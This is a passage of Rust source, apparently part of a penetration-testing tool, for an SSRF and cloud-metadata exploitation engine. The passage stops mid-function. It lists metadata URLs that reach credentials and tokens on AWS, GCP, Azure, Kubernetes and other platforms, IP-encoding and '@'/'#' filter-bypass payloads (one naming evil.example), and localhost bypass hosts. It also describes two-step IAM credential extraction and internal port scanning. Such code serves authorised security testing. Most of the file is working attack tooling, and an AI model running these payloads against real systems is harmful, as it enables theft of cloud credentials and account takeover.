//! SSRF & Cloud-Metadata Exploitation Engine — a world-class, real-probe Server-Side Request
//! Forgery scanner built around the attack that defines modern cloud breaches: SSRF → instance
//! metadata (IMDS) → stolen cloud credentials → account takeover (the canonical Wiz / Orca
//! cloud-attack-path demo), fused with PortSwigger-grade SSRF technique depth.
//!
//! Strict "real-probe-only" contract: a finding is emitted **only** when the engine observes a real
//! signal in a real HTTP response (a cloud-metadata canary, `/etc/passwd` content, an open-redirect
//! `Location`, or a calibrated differential that is not mere reflection). Otherwise only the honest
//! posture summary is returned. Nothing is fabricated.
//!
//! Capabilities (all live against the operator-supplied target):
//!   1. **Multi-cloud IMDS corpus (14 providers)** — AWS (IMDSv1/v2 awareness, IPv6 IMDS, IAM-info,
//!      identity-credentials), GCP, Azure, Alibaba, Oracle OCI, DigitalOcean, OpenStack, IBM Cloud,
//!      Hetzner, Yandex, Huawei, Scaleway, Tencent, Vultr, plus the Kubernetes API/kubelet — each
//!      with content canaries so a hit is unambiguous credential exposure.
//!   2. **Two-step AWS credential extraction** — on an IMDS hit the engine enumerates the IAM role,
//!      then fetches that role's *live* temporary credentials through the same SSRF, proving full
//!      account compromise (all secret material is redacted before it is ever recorded).
//!   3. **URL-parser bypass library** — decimal / hex / dotted-hex / octal / IPv4-mapped-IPv6
//!      encodings of 169.254.169.254, `nip.io`/encoded-dot DNS, and userinfo (`@`) confusion.
//!   4. **Injection surface** — query parameters (default corpus + operator list + discovered
//!      paths), request headers (`X-Forwarded-*`, `X-Original-URL`, `Forwarded`, …), and POST/JSON
//!      body fields (webhook / URL-preview / PDF-render sinks).
//!   5. **Alternate schemes** — `file://` local-file read (with `/etc/passwd` confirmation),
//!      `gopher://` / `dict://` internal-protocol smuggling surface.
//!   6. **Open-redirect confirmation** — `Location`-header verification (SSRF chaining + phishing).
//!   7. **OOB/OAST planting** + **time-based blind oracle** — out-of-band tokens when an interaction
//!      domain is supplied, and a latency oracle that confirms *blind* SSRF with no OAST at all.
//!   8. **Control calibration** — a benign control distinguishes a true server-side fetch from
//!      harmless reflection, keeping the engine false-positive-lean.
//!   9. **Internal reachability** — optional SSRF-driven probing of internal ports/hosts.
//!  10. **Secret redaction + attack-path synthesis** — leaked credentials are redacted into
//!      evidence, and Wiz-style toxic-combination chains are derived with a graded exposure score.
//!  11. **SSRF sink auto-discovery** — probes common webhook/fetch/proxy/preview API paths
//!      where URL parameters are typically accepted (depth ≥ 2).
//!  12. **Filter-bypass wrappers** — `@`/`#`/backslash/short-form-IP/unicode-dot variants
//!      layered on top of metadata URLs to defeat naive blocklists.
//!  13. **IMDSv2 posture probe** — detects whether AWS IMDSv2 token endpoint is reachable
//!      (reports enforcement state honestly from real HTTP signals).
//!  14. **GraphQL SSRF** — probes `/graphql` sinks with URL variables / inline fetch arguments.
//!  15. **Multipart form SSRF** — `multipart/form-data` webhook sinks (PDF renderers, importers).
//!  16. **Internal SaaS fingerprinting** — classifies Elasticsearch, Jenkins, Grafana, Kibana,
//!      Docker, Consul responses reached through SSRF (banner/canary, not guesswork).
//!  17. **Multi-role AWS + ECS credential chains** — extracts *every* enumerated IAM role (≤3)
//!      and Fargate task credentials when the metadata listing is exposed.
//!  18. **Redirect→metadata chain** — tests whether an open-redirect parameter follows through
//!      to cloud metadata (allow-list bypass → credential theft in one hop).
//!
//! Every knob is read from the live scan request body (`POST /api/command-center/scan` →
//! `EngineRunContext::job_params`). MITRE: T1090 (Proxy) / T1552.005 (Cloud Instance Metadata API).

use crate::arsenal_config::{finding_rich, severity_for_score, ArsenalConfig, Evidence};
use crate::engine_dispatch::EngineRunContext;
use crate::engine_probes::{
    extract_host, header_value, http_get, http_get_with_headers, http_post_json, join_url,
    normalize_url, HttpProbe,
};
use crate::engine_result::{print_result, EngineResult};
use futures::stream::{self, StreamExt};
use serde_json::{json, Value};
use std::collections::{BTreeMap, BTreeSet};
use std::time::{Duration, Instant};

const ENGINE_ID: &str = "ssrf_advanced";
const REDIRECT_MARKER_HOST: &str = "oob.weissman-ssrf-probe.com";
const REDIRECT_MARKER_URL: &str = "https://oob.weissman-ssrf-probe.com/redirect-canary";

// ─────────────────────────────────────────────────────────────────────────────
// Cloud-metadata corpus — each entry's canaries make a content hit unambiguous.
// ─────────────────────────────────────────────────────────────────────────────

struct MetaTarget {
    provider: &'static str,
    url: &'static str,
    canaries: &'static [&'static str],
    /// Minimum scan depth (1=light .. 4=exhaustive) at which this target is probed.
    min_depth: u8,
    note: &'static str,
}

#[rustfmt::skip]
fn metadata_corpus() -> &'static [MetaTarget] {
    static M: &[MetaTarget] = &[
        // ── AWS (the highest-value target: IMDSv1 GET → IAM role credentials) ──
        MetaTarget { provider: "aws", url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", canaries: &["AccessKeyId", "SecretAccessKey", "security-credentials", "Token"], min_depth: 1, note: "IMDSv1 IAM role credentials (GET works only if IMDSv2 not enforced)" },
        MetaTarget { provider: "aws", url: "http://169.254.169.254/latest/meta-data/", canaries: &["ami-id", "instance-id", "local-ipv4", "hostname", "iam/"], min_depth: 1, note: "IMDS metadata root" },
        MetaTarget { provider: "aws", url: "http://169.254.169.254/latest/dynamic/instance-identity/document", canaries: &["accountId", "instanceId", "imageId", "\"region\""], min_depth: 2, note: "instance identity document (account id)" },
        MetaTarget { provider: "aws", url: "http://169.254.169.254/latest/user-data", canaries: &["#!/bin/", "#cloud-config", "BEGIN", "AWS_"], min_depth: 3, note: "EC2 user-data (often contains secrets)" },
        // ── AWS parser-bypass encodings (defeat naive 169.254.x filters) ──
        MetaTarget { provider: "aws-bypass", url: "http://2852039166/latest/meta-data/iam/security-credentials/", canaries: &["AccessKeyId", "SecretAccessKey", "Token"], min_depth: 3, note: "decimal-IP bypass of 169.254.169.254" },
        MetaTarget { provider: "aws-bypass", url: "http://0xA9FEA9FE/latest/meta-data/iam/security-credentials/", canaries: &["AccessKeyId", "SecretAccessKey", "Token"], min_depth: 3, note: "hex-IP bypass of 169.254.169.254" },
        MetaTarget { provider: "aws-bypass", url: "http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/", canaries: &["AccessKeyId", "SecretAccessKey", "Token"], min_depth: 4, note: "octal-IP bypass of 169.254.169.254" },
        MetaTarget { provider: "aws-bypass", url: "http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/", canaries: &["AccessKeyId", "SecretAccessKey", "Token"], min_depth: 4, note: "IPv4-mapped-IPv6 bypass" },
        MetaTarget { provider: "aws-bypass", url: "http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/", canaries: &["AccessKeyId", "SecretAccessKey", "Token"], min_depth: 4, note: "nip.io DNS bypass" },
        // ── GCP (requires Metadata-Flavor: Google on the server-side fetch) ──
        MetaTarget { provider: "gcp", url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", canaries: &["access_token", "token_type", "expires_in"], min_depth: 1, note: "GCP service-account OAuth token" },
        MetaTarget { provider: "gcp", url: "http://metadata.google.internal/computeMetadata/v1/?recursive=true", canaries: &["computeMetadata", "serviceAccounts", "numericProjectId", "\"email\""], min_depth: 2, note: "GCP recursive metadata tree" },
        MetaTarget { provider: "gcp", url: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", canaries: &["access_token", "token_type"], min_depth: 3, note: "GCP via link-local IP" },
        // ── Azure IMDS (requires Metadata: true) ──
        MetaTarget { provider: "azure", url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", canaries: &["azEnvironment", "subscriptionId", "\"vmId\"", "resourceGroupName"], min_depth: 1, note: "Azure instance metadata" },
        MetaTarget { provider: "azure", url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", canaries: &["access_token", "token_type", "expires_in"], min_depth: 2, note: "Azure managed-identity token" },
        // ── Alibaba Cloud ──
        MetaTarget { provider: "alibaba", url: "http://100.100.100.200/latest/meta-data/ram/security-credentials/", canaries: &["AccessKeyId", "AccessKeySecret", "SecurityToken"], min_depth: 2, note: "Alibaba RAM role credentials" },
        MetaTarget { provider: "alibaba", url: "http://100.100.100.200/latest/meta-data/", canaries: &["instance-id", "region-id", "owner-account-id"], min_depth: 3, note: "Alibaba metadata root" },
        // ── Oracle Cloud (OCI) ──
        MetaTarget { provider: "oracle", url: "http://169.254.169.254/opc/v2/instance/", canaries: &["compartmentId", "canonicalRegionName", "\"ociAdName\"", "\"shape\""], min_depth: 3, note: "OCI instance metadata v2" },
        // ── DigitalOcean ──
        MetaTarget { provider: "digitalocean", url: "http://169.254.169.254/metadata/v1.json", canaries: &["droplet_id", "\"region\"", "interfaces", "floating_ip"], min_depth: 3, note: "DigitalOcean droplet metadata" },
        // ── OpenStack ──
        MetaTarget { provider: "openstack", url: "http://169.254.169.254/openstack/latest/meta_data.json", canaries: &["\"uuid\"", "availability_zone", "project_id", "meta_data"], min_depth: 4, note: "OpenStack metadata" },
        // ── AWS additional high-value paths ──
        MetaTarget { provider: "aws", url: "http://169.254.169.254/latest/meta-data/iam/info", canaries: &["InstanceProfileArn", "InstanceProfileId", "\"Code\""], min_depth: 2, note: "IAM instance-profile info (ARN discloses account id)" },
        MetaTarget { provider: "aws", url: "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", canaries: &["AccessKeyId", "SecretAccessKey", "Token"], min_depth: 3, note: "EC2 identity credentials" },
        // ── AWS additional parser-bypass encodings ──
        MetaTarget { provider: "aws-bypass", url: "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/iam/security-credentials/", canaries: &["AccessKeyId", "SecretAccessKey", "Token"], min_depth: 4, note: "dotted-hex IP bypass" },
        MetaTarget { provider: "aws-bypass", url: "http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/", canaries: &["AccessKeyId", "SecretAccessKey", "Token"], min_depth: 4, note: "expanded IPv4-mapped IPv6 bypass" },
        MetaTarget { provider: "aws-bypass", url: "http://169.254.169.254%2e.nip.io/latest/meta-data/iam/security-credentials/", canaries: &["AccessKeyId", "SecretAccessKey", "Token"], min_depth: 4, note: "encoded-dot DNS bypass" },
        // ── IBM Cloud VPC ──
        MetaTarget { provider: "ibmcloud", url: "http://169.254.169.254/metadata/v1/instance?version=2022-03-01", canaries: &["\"crn\"", "\"profile\"", "\"vpc\"", "\"zone\""], min_depth: 3, note: "IBM Cloud VPC instance metadata" },
        // ── Hetzner Cloud ──
        MetaTarget { provider: "hetzner", url: "http://169.254.169.254/hetzner/v1/metadata", canaries: &["instance-id", "public-ipv4", "availability-zone", "region"], min_depth: 4, note: "Hetzner Cloud metadata" },
        // ── Yandex Cloud (GCP-compatible IMDS) ──
        MetaTarget { provider: "yandex", url: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", canaries: &["access_token", "token_type", "expires_in"], min_depth: 3, note: "Yandex Cloud SA token (GCP-compatible)" },
        // ── Huawei Cloud ──
        MetaTarget { provider: "huawei", url: "http://169.254.169.254/openstack/latest/securitykey", canaries: &["\"access\"", "\"secret\"", "securitytoken", "\"credential\""], min_depth: 4, note: "Huawei Cloud temporary security key" },
        // ── Scaleway ──
        MetaTarget { provider: "scaleway", url: "http://169.254.42.42/conf?format=json", canaries: &["commercial_type", "\"organization\"", "private_ip", "\"id\""], min_depth: 4, note: "Scaleway instance metadata" },
        // ── Tencent Cloud ──
        MetaTarget { provider: "tencent", url: "http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/", canaries: &["TmpSecretId", "TmpSecretKey", "Token"], min_depth: 3, note: "Tencent CAM role credentials" },
        MetaTarget { provider: "tencent", url: "http://metadata.tencentyun.com/latest/meta-data/", canaries: &["instance-id", "placement", "\"uuid\""], min_depth: 4, note: "Tencent Cloud metadata root" },
        // ── Vultr ──
        MetaTarget { provider: "vultr", url: "http://169.254.169.254/v1.json", canaries: &["instance-v2-id", "\"hostname\"", "\"bgp\"", "public-keys"], min_depth: 4, note: "Vultr metadata" },
        // ── AWS ECS/Fargate task credentials (high-value in containers) ──
        MetaTarget { provider: "aws", url: "http://169.254.170.2/v2/credentials/", canaries: &["AccessKeyId", "SecretAccessKey", "Token", "RoleArn"], min_depth: 3, note: "ECS/Fargate task IAM credentials (169.254.170.2)" },
        // ── AWS Lambda runtime environment (when SSRF runs inside Lambda) ──
        MetaTarget { provider: "aws", url: "http://localhost:9001/2018-06-01/runtime/invocation/next", canaries: &["requestId", "traceId", "x-amzn"], min_depth: 4, note: "Lambda runtime API (RCE if reachable from SSRF)" },
        // ── AWS IMDSv2 token endpoint (posture: reachable = SSRF can still hit metadata plane) ──
        MetaTarget { provider: "aws", url: "http://169.254.169.254/latest/api/token", canaries: &["InvalidMetadataToken", "TTL", "token", "Unauthorized"], min_depth: 2, note: "IMDSv2 token endpoint (401/403 = v2 enforced but still reachable)" },
        // ── Azure MSI alternate host ──
        MetaTarget { provider: "azure", url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://vault.azure.net", canaries: &["access_token", "expires_in", "resource"], min_depth: 3, note: "Azure MSI token for Key Vault" },
        // ── Link-local Docker/K8s internal APIs (in-cluster SSRF) ──
        MetaTarget { provider: "kubernetes", url: "http://127.0.0.1:2375/version", canaries: &["ApiVersion", "MinAPIVersion", "GitCommit", "Os"], min_depth: 3, note: "Docker daemon API (unauthenticated RCE)" },
        MetaTarget { provider: "kubernetes", url: "http://127.0.0.1:8500/v1/agent/self", canaries: &["\"Config\"", "Datacenter", "MemberAddr", "consul"], min_depth: 4, note: "Consul agent API (service discovery)" },
        MetaTarget { provider: "kubernetes", url: "http://127.0.0.1:2379/version", canaries: &["etcdserver", "etcdcluster", "major"], min_depth: 4, note: "etcd API (cluster secrets)" },
        // ── Kubernetes control plane / kubelet (SSRF inside a pod) ──
        MetaTarget { provider: "kubernetes", url: "https://kubernetes.default.svc/api", canaries: &["\"versions\"", "\"serverAddressByClientCIDRs\"", "forbidden", "\"kind\""], min_depth: 3, note: "in-cluster Kubernetes API server" },
        MetaTarget { provider: "kubernetes", url: "http://127.0.0.1:10255/pods", canaries: &["\"kind\":\"PodList\"", "containerStatuses", "namespace"], min_depth: 4, note: "read-only kubelet API" },
    ];
    M
}

const DEFAULT_PARAMS: &[&str] = &[
    "url",
    "uri",
    "u",
    "link",
    "src",
    "source",
    "dest",
    "destination",
    "redirect",
    "redirect_uri",
    "redirect_url",
    "return",
    "returnUrl",
    "return_url",
    "next",
    "goto",
    "forward",
    "fetch",
    "callback",
    "webhook",
    "endpoint",
    "target",
    "load",
    "page",
    "path",
    "proxy",
    "host",
    "site",
    "data",
    "reference",
    "ref",
    "feed",
    "image_url",
    "img",
    "file",
    "document",
    "domain",
    "port",
    "continue",
    "out",
    "view",
    "to",
    "show",
    "val",
    "validate",
    "remote",
    "open",
];

const REDIRECT_PARAMS: &[&str] = &[
    "url",
    "next",
    "return",
    "returnUrl",
    "return_url",
    "redirect",
    "redir",
    "goto",
    "forward",
    "dest",
    "destination",
    "continue",
    "rurl",
    "checkout_url",
    "ReturnUrl",
];

const SSRF_HEADERS: &[&str] = &[
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Forwarded-Server",
    "X-Host",
    "X-Original-URL",
    "X-Rewrite-URL",
    "Forwarded",
    "X-Real-IP",
    "True-Client-IP",
    "Client-IP",
    "X-Client-IP",
    "CF-Connecting-IP",
    "Referer",
];

const INTERNAL_PORTS: &[u16] = &[
    22, 80, 443, 2375, 3306, 5432, 6379, 8080, 8443, 9000, 9200, 10250, 11211, 15672, 27017,
];

/// Common application paths where URL-fetch / webhook / preview sinks live (auto-probed depth ≥ 2).
const COMMON_SSRF_SINK_PATHS: &[&str] = &[
    "/api/fetch",
    "/api/proxy",
    "/api/webhook",
    "/api/preview",
    "/api/import",
    "/api/url",
    "/proxy",
    "/fetch",
    "/webhook",
    "/preview",
    "/render",
    "/pdf",
    "/download",
    "/import",
    "/load",
    "/redirect",
    "/out",
    "/link",
    "/open",
    "/share",
    "/embed",
    "/oembed",
    "/screenshot",
    "/thumbnail",
    "/image",
    "/avatar",
    "/logo",
    "/favicon",
    "/healthcheck",
    "/ping",
    "/status",
    "/callback",
    "/oauth/callback",
    "/sso/callback",
];

/// GraphQL HTTP endpoints commonly hosting URL-fetch resolvers (depth ≥ 3).
const GRAPHQL_ENDPOINTS: &[&str] = &[
    "/graphql",
    "/api/graphql",
    "/v1/graphql",
    "/gql",
    "/query",
    "/api/gql",
    "/api/v1/graphql",
];

/// Localhost blocklist-bypass encodings appended to internal targets when `check_bypass` is on.
const LOCALHOST_BYPASS_HOSTS: &[&str] = &[
    "http://2130706433/",
    "http://0/",
    "http://127.1/",
    "http://0177.0.0.1/",
    "http://[::1]/",
    "http://0.0.0.0/",
];

// ─────────────────────────────────────────────────────────────────────────────
// Runtime configuration from ctx.job_params.
// ─────────────────────────────────────────────────────────────────────────────

struct Settings {
    depth: u8,
    timeout_ms: u64,
    concurrency: usize,
    params: Vec<String>,
    redirect_params: Vec<String>,
    check_metadata: bool,
    test_headers: bool,
    test_schemes: bool,
    parser_bypass: bool,
    open_redirect: bool,
    internal_port_scan: bool,
    internal_ports: Vec<u16>,
    internal_hosts: Vec<String>,
    custom_payloads: Vec<String>,
    oob_enabled: bool,
    oast_domain: Option<String>,
    oast_token: Option<String>,
    auth_headers: Vec<(String, String)>,
    provider_filter: BTreeSet<String>,
    extra_points: Vec<String>,
    attack_synth: bool,
    posture_scoring: bool,
    timing_oracle: bool,
    test_body: bool,
    test_graphql: bool,
    test_multipart: bool,
    redirect_metadata_chain: bool,
    min_sev_rank: u8,
    max_requests: usize,
}

fn depth_from_str(s: &str) -> u8 {
    match s.trim().to_ascii_lowercase().as_str() {
        "light" | "passive" | "safe" | "1" => 1,
        "aggressive" | "deep" | "3" => 3,
        "exhaustive" | "max" | "paranoid" | "4" => 4,
        _ => 2,
    }
}

fn sev_rank(s: &str) -> u8 {
    match s.trim().to_ascii_lowercase().as_str() {
        "critical" => 4,
        "high" => 3,
        "medium" => 2,
        "low" => 1,
        _ => 0,
    }
}

/// Parse auth material the GUI exposes (`auth_header` / `bearer_token` / `cookies`) into headers
/// applied to every probe — essential for authenticated SSRF surfaces.
fn parse_auth_headers(cfg: &ArsenalConfig) -> Vec<(String, String)> {
    let mut hs: Vec<(String, String)> = Vec::new();
    if let Some(ah) = cfg.string("auth_header") {
        if let Some((k, v)) = ah.split_once(':') {
            let (k, v) = (k.trim(), v.trim());
            if !k.is_empty() && !v.is_empty() {
                hs.push((k.to_string(), v.to_string()));
            }
        }
    }
    if let Some(bt) = cfg.string("bearer_token") {
        let bt = bt.trim();
        if !bt.is_empty()
            && !hs
                .iter()
                .any(|(k, _)| k.eq_ignore_ascii_case("authorization"))
        {
            let val = if bt.to_ascii_lowercase().starts_with("bearer ") {
                bt.to_string()
            } else {
                format!("Bearer {bt}")
            };
            hs.push(("Authorization".to_string(), val));
        }
    }
    if let Some(ck) = cfg.string("cookies") {
        if !ck.trim().is_empty() {
            hs.push(("Cookie".to_string(), ck.trim().to_string()));
        }
    }
    hs
}

fn parse_settings(ctx: &EngineRunContext) -> Settings {
    let cfg = ArsenalConfig::from_ctx(ctx);
    let depth = depth_from_str(&cfg.string_or("intensity", "normal"));

    // Injection parameters (GUI `params`), capped by `max_params` (auto-scales with depth).
    let mut params: Vec<String> = cfg.string_list("params");
    if params.is_empty() {
        params = DEFAULT_PARAMS.iter().map(|s| (*s).to_string()).collect();
    }
    let auto_params = match depth {
        1 => 6,
        2 => 12,
        3 => 24,
        _ => params.len().max(24),
    };
    let max_params = cfg.usize_or("max_params", auto_params).clamp(1, 100);
    params.truncate(max_params);

    // Redirect parameters (GUI `redirect_params`), default to the curated list.
    let redirect_params = {
        let r = cfg.string_list("redirect_params");
        if r.is_empty() {
            REDIRECT_PARAMS.iter().map(|s| (*s).to_string()).collect()
        } else {
            r
        }
    };

    // Extra endpoints: GUI `paths` + legacy `extra_paths` + discovered paths, capped by `max_paths`.
    let mut extra_points: Vec<String> = cfg.string_list("paths");
    extra_points.extend(cfg.string_list("extra_paths"));
    if depth >= 2 {
        for p in ctx
            .discovered_paths
            .iter()
            .take(if depth >= 3 { 24 } else { 8 })
        {
            extra_points.push(p.clone());
        }
        // Auto-probe common SSRF sink paths (webhook/fetch/proxy/preview APIs).
        for sink in COMMON_SSRF_SINK_PATHS {
            if !extra_points.iter().any(|e| e == sink) {
                extra_points.push((*sink).to_string());
            }
        }
    }
    let auto_paths = match depth {
        1 => 1,
        2 => 3,
        3 => 6,
        _ => 12,
    };
    let max_paths = cfg.usize_or("max_paths", auto_paths).clamp(0, 64);
    extra_points.truncate(max_paths);

    // Provider filter: GUI `cloud_providers`, legacy `metadata_providers`.
    let mut prov = cfg.string_list("cloud_providers");
    prov.extend(cfg.string_list("metadata_providers"));
    let provider_filter: BTreeSet<String> = prov
        .into_iter()
        .map(|s| s.to_ascii_lowercase())
        .filter(|s| s != "all" && !s.is_empty())
        .collect();

    // Toggles — honour GUI `check_*` keys, falling back to legacy keys then depth defaults.
    let read_toggle = |gui: &str, legacy: &str, default: bool| -> bool {
        cfg.bool_or(gui, cfg.bool_or(legacy, default))
    };
    let parser_bypass = read_toggle("check_bypass", "parser_bypass", depth >= 3);

    let mut internal_hosts = cfg.string_list("internal_hosts");
    if parser_bypass {
        for h in LOCALHOST_BYPASS_HOSTS {
            if !internal_hosts.iter().any(|x| x == h) {
                internal_hosts.push((*h).to_string());
            }
        }
    }

    Settings {
        depth,
        timeout_ms: cfg.timeout_ms(8_000),
        concurrency: cfg.concurrency(),
        params,
        redirect_params,
        check_metadata: cfg.bool_or("check_metadata", true),
        test_headers: read_toggle("check_headers", "test_headers", depth >= 2),
        test_schemes: read_toggle("check_schemes", "test_schemes", depth >= 2),
        parser_bypass,
        open_redirect: read_toggle("check_open_redirect", "open_redirect", true),
        internal_port_scan: read_toggle("check_internal", "internal_port_scan", depth >= 3),
        internal_ports: cfg.ports_or("internal_ports", INTERNAL_PORTS),
        internal_hosts,
        custom_payloads: cfg.string_list("custom_payloads"),
        oob_enabled: cfg.bool_or("check_oob", true),
        oast_domain: cfg
            .string("oast_domain")
            .or_else(|| cfg.string("collaborator")),
        oast_token: cfg.string("oast_token"),
        auth_headers: parse_auth_headers(&cfg),
        provider_filter,
        extra_points,
        attack_synth: read_toggle("attack_path_synthesis", "attack_paths", true),
        posture_scoring: cfg.bool_or("posture_scoring", true),
        timing_oracle: read_toggle("check_timing", "timing_oracle", depth >= 3),
        test_body: read_toggle("check_body", "test_body", depth >= 2),
        test_graphql: read_toggle("check_graphql", "test_graphql", depth >= 3),
        test_multipart: read_toggle("check_multipart", "test_multipart", depth >= 2),
        redirect_metadata_chain: read_toggle(
            "check_redirect_chain",
            "redirect_metadata_chain",
            depth >= 2,
        ),
        min_sev_rank: sev_rank(&cfg.string_or("min_severity", "info")),
        max_requests: cfg.usize_or("max_requests", 600).clamp(20, 5_000),
    }
}

async fn build_client(timeout_ms: u64, auth: &[(String, String)]) -> reqwest::Client {
    let mut hmap = reqwest::header::HeaderMap::new();
    for (k, v) in auth {
        if let (Ok(name), Ok(val)) = (
            reqwest::header::HeaderName::from_bytes(k.as_bytes()),
            reqwest::header::HeaderValue::from_str(v),
        ) {
            hmap.insert(name, val);
        }
    }
    reqwest::Client::builder()
        .timeout(Duration::from_millis(timeout_ms))
        .danger_accept_invalid_certs(weissman_core::tls_policy::danger_accept_invalid_certs())
        .user_agent("Weissman-SSRF-Probe/2.0")
        .default_headers(hmap)
        .redirect(reqwest::redirect::Policy::none()) // never auto-follow → catch open redirects
        .build()
        .unwrap_or_else(|_| reqwest::Client::new())
}

// ─────────────────────────────────────────────────────────────────────────────
// URL helpers.
// ─────────────────────────────────────────────────────────────────────────────

fn add_query(url: &str, key: &str, value: &str) -> String {
    let sep = if url.contains('?') { '&' } else { '?' };
    format!("{url}{sep}{key}={}", urlencoding::encode(value))
}

/// Generate URL-parser / blocklist-bypass wrappers for a metadata URL (`@`, `#`, backslash).
fn filter_bypass_variants(url: &str) -> Vec<(String, &'static str)> {
    let mut out = Vec::new();
    let Some(rest) = url.strip_prefix("http://") else {
        return out;
    };
    let (host_path, _) = rest.split_once('#').unwrap_or((rest, ""));
    // `@` userinfo confusion — decoy domain in userinfo, real metadata host after `@`.
    out.push((
        format!("http://allowed.example@{host_path}"),
        "@ userinfo host confusion",
    ));
    out.push((
        format!("http://127.0.0.1@{host_path}"),
        "@ userinfo localhost decoy",
    ));
    // `#` fragment confusion — some parsers strip fragments incorrectly.
    out.push((
        format!("http://{host_path}#@evil.example/"),
        "# fragment host confusion",
    ));
    // Backslash path confusion (PHP / Windows URL parsers).
    if let Some((host, path)) = host_path.split_once('/') {
        let path = path.trim_start_matches('/');
        if !path.is_empty() {
            out.push((
                format!("http://{host}/\\{path}"),
                "backslash path confusion",
            ));
        }
    }
    // Double-encoded dot in hostname (when host contains dots).
    if host_path.contains("169.254.169.254") {
        let enc = host_path.replace("169.254.169.254", "169%2e254%2e169%2e254");
        out.push((format!("http://{enc}"), "double-encoded dot bypass"));
    }
    out
}

async fn http_post_xml(
    client: &reqwest::Client,
    url: &str,
    field: &str,
    value: &str,
) -> Option<HttpProbe> {
    let body = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?><request><{field}>{}</{field}></request>"#,
        value
            .replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('>', "&gt;")
    );
    let resp = client
        .post(url)
        .header("Content-Type", "application/xml")
        .body(body)
        .send()
        .await
        .ok()?;
    let status = resp.status().as_u16();
    let final_url = resp.url().to_string();
    let headers: Vec<(String, String)> = resp
        .headers()
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or_default().to_string()))
        .collect();
    let body = resp.text().await.unwrap_or_default();
    let body = if body.len() > 65_536 {
        body[..65_536].to_string()
    } else {
        body
    };
    Some(HttpProbe {
        status,
        headers,
        body,
        final_url,
    })
}

/// POST `multipart/form-data` with a URL-bearing field (PDF renderers, importers, webhook forms).
async fn http_post_multipart_url(
    client: &reqwest::Client,
    url: &str,
    field: &str,
    url_value: &str,
) -> Option<HttpProbe> {
    let boundary = "----WeissmanSsrfMultipart9137";
    let body = format!(
        "--{boundary}\r\nContent-Disposition: form-data; name=\"{field}\"\r\n\r\n{url_value}\r\n--{boundary}--\r\n",
        boundary = boundary,
        field = field,
        url_value = url_value
    );
    let resp = client
        .post(url)
        .header(
            "Content-Type",
            format!("multipart/form-data; boundary={boundary}"),
        )
        .body(body)
        .send()
        .await
        .ok()?;
    let status = resp.status().as_u16();
    let final_url = resp.url().to_string();
    let headers: Vec<(String, String)> = resp
        .headers()
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or_default().to_string()))
        .collect();
    let body = resp.text().await.unwrap_or_default();
    let body = if body.len() > 65_536 {
        body[..65_536].to_string()
    } else {
        body
    };
    Some(HttpProbe {
        status,
        headers,
        body,
        final_url,
    })
}

/// POST a GraphQL document with variables carrying an SSRF payload (URL-fetch resolvers).
async fn http_post_graphql_ssrf(
    client: &reqwest::Client,
    url: &str,
    document: &str,
    variables: &Value,
) -> Option<HttpProbe> {
    let payload = json!({ "query": document, "variables": variables });
    http_post_json(client, url, &payload).await
}

fn graphql_probe_endpoints(base: &str) -> Vec<String> {
    let root = base.trim_end_matches('/');
    let mut out: Vec<String> = Vec::new();
    for ep in GRAPHQL_ENDPOINTS {
        out.push(join_url(root, ep));
    }
    // If the scan target itself looks like a GraphQL route, include it.
    if root.contains("/graphql") || root.ends_with("/gql") || root.ends_with("/query") {
        out.push(root.to_string());
    }
    out.sort();
    out.dedup();
    out
}

/// Classify an internal service reached via SSRF from real response banners/canaries.
fn classify_internal_service(
    body: &str,
    target: &str,
) -> Option<(&'static str, &'static str, &'static str)> {
    let signatures: &[(&str, &[&str], &str)] = &[
        (
            "Elasticsearch",
            &[
                "\"cluster_name\"",
                "You Know, for Search",
                "lucene_version",
                "\"tagline\"",
            ],
            "medium",
        ),
        (
            "Jenkins",
            &[
                "Dashboard [Jenkins]",
                "jenkins-headshot",
                "Build History",
                "Manage Jenkins",
            ],
            "high",
        ),
        (
            "Grafana",
            &[
                "grafana-app",
                "Grafana",
                "loginBackgroundUrl",
                "public/app/plugins",
            ],
            "high",
        ),
        (
            "Kibana",
            &[
                "kbn-version",
                "kibanaWelcomeView",
                "Elastic",
                "Discover - Kibana",
            ],
            "medium",
        ),
        (
            "Docker Engine",
            &["ApiVersion", "MinAPIVersion", "GitCommit", "KernelVersion"],
            "critical",
        ),
        (
            "Consul",
            &["\"Config\"", "Datacenter", "MemberAddr", "\"consul\""],
            "high",
        ),
        (
            "Redis",
            &[
                "-ERR",
                "+PONG",
                "redis_version",
                "NOAUTH Authentication required",
            ],
            "high",
        ),
        (
            "MongoDB",
            &["MongoDB", "ismaster", "Wire version", "ok: 1"],
            "high",
        ),
        (
            "PostgreSQL",
            &["PostgreSQL", "FATAL:", "invalid length of startup packet"],
            "high",
        ),
        (
            "MySQL/MariaDB",
            &[
                "mysql_native_password",
                "MariaDB",
                "caching_sha2_password",
                "Access denied for user",
            ],
            "high",
        ),
        (
            "etcd",
            &["etcdserver", "etcdcluster", "\"etcd\""],
            "critical",
        ),
        (
            "Kubernetes API",
            &[
                "\"kind\":\"APIVersions\"",
                "forbidden: User",
                "Priority and Fairness",
            ],
            "critical",
        ),
        (
            "Prometheus",
            &[
                "Prometheus Time Series",
                "prometheus_build_info",
                "graph/query",
            ],
            "medium",
        ),
    ];
    for (name, canaries, sev) in signatures {
        if let Some(hit) = canaries.iter().copied().find(|c| body.contains(*c)) {
            return Some((name, hit, sev));
        }
    }
